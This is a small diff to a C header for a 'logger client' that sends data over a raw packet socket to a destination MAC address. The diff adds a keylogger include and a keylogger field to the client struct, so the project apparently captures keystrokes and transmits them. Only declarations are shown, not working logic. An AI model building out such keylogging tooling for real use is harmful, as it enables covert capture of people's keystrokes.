@@ -2,11 +2,13 @@
 #define __CLIENT_H__
 
 #include "error_code.h"
+#include "keylogger.h"
 #include "std_include.h"
 
 typedef struct logger_client {
     int raw_sd;
     struct sockaddr_ll server_address;
+    keylogger_t keylogger;
 } logger_client_t;
 
 ErrorCode client_init(logger_client_t *client, uint8_t interface_idx, uint8_t *dest_mac);
